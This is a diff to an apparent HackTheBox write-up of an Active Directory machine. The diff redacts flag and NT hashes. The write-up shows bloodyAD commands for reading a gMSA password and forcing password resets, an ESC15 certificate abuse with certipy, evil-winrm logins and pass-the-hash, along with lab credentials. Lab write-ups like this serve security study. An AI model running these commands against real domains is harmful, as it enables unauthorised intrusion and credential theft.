@@ -11,11 +11,6 @@ tags: [hackthebox, windows, active-directory, kerberoast, gmsa, adcs, esc15, cve
 
 Domain Controller with a long AD ACL abuse chain. Initial creds for henry allow WriteSPN over alfred → Targeted Kerberoast → password crack. Alfred uses AddSelf to join INFRASTRUCTURE → reads the ansible_devs gMSA password. ansible_devs has ForceChangePassword over sam → reset. sam has WriteOwner over john → GenericAll → password reset. john has GenericAll over the ADCS OU → restores cert_admin from AD Recycle Bin. With cert_admin, **ESC15 (CVE-2024-49019)** is exploited: the WebServer template with `EnrolleeSuppliesSubject` and Schema Version 1 allows injecting a Client Authentication policy → certificate signed as Administrator → Pass-the-Hash.
 
-| Flag | Hash |
-|------|------|
-| user.txt | `a5e5731f9275238d9bf2ba9efe04f2b9` |
-| root.txt | `9f963dd1c34012a0a9ae54316d954f71` |
-
 ---
 
 ## 1. Reconnaissance
@@ -55,7 +50,7 @@ bloodyAD --host 'DC01.tombwatcher.htb' -d tombwatcher.htb \
   -u alfred -p basketball \
   get object 'CN=ansible_dev,CN=Managed Service Accounts,DC=tombwatcher,DC=htb' \
   --attr msDS-ManagedPassword
-# NT: cba56cd2df7d642f622e2a59956f6d47
+# NT: <hash>
 ```
 
 ---
@@ -64,7 +59,7 @@ bloodyAD --host 'DC01.tombwatcher.htb' -d tombwatcher.htb \
 
 ```bash
 bloodyAD --host 'DC01.tombwatcher.htb' -d tombwatcher.htb \
-  -u 'ansible_dev$' -p ':cba56cd2df7d642f622e2a59956f6d47' \
+  -u 'ansible_dev$' -p ':<hash>' \
   set password sam 'Rogue@123!'
 ```
 
@@ -84,7 +79,7 @@ bloodyAD --host 'DC01.tombwatcher.htb' -d tombwatcher.htb \
 
 evil-winrm -i DC01.tombwatcher.htb -u john -p 'Rogue@123!'
 type C:\Users\john\Desktop\user.txt
-# a5e5731f9275238d9bf2ba9efe04f2b9
+# <hash>
 ```
 
 ---
@@ -149,13 +144,13 @@ certipy req \
 
 ```bash
 certipy auth -dc-ip 10.129.232.167 -pfx administrator.pfx
-# NT hash: f61db423bebe3328d33af26741afe5fc
+# NT hash: <hash>
 
 evil-winrm -i DC01.tombwatcher.htb -u administrator \
-  -H f61db423bebe3328d33af26741afe5fc
+  -H <hash>
 
 type C:\Users\Administrator\Desktop\root.txt
-# 9f963dd1c34012a0a9ae54316d954f71
+# <hash>
 ```
 
 ---
@@ -167,7 +162,7 @@ henry (H3nry_987TGV!)
   ↓ WriteSPN → Targeted Kerberoast
 alfred (basketball)
   ↓ AddSelf → INFRASTRUCTURE → gMSA read
-ansible_devs (NTLM: cba56cd2df7d642f622e2a59956f6d47)
+ansible_devs (NTLM: <hash>)
   ↓ ForceChangePassword
 sam (Rogue@123!)
   ↓ WriteOwner → GenericAll
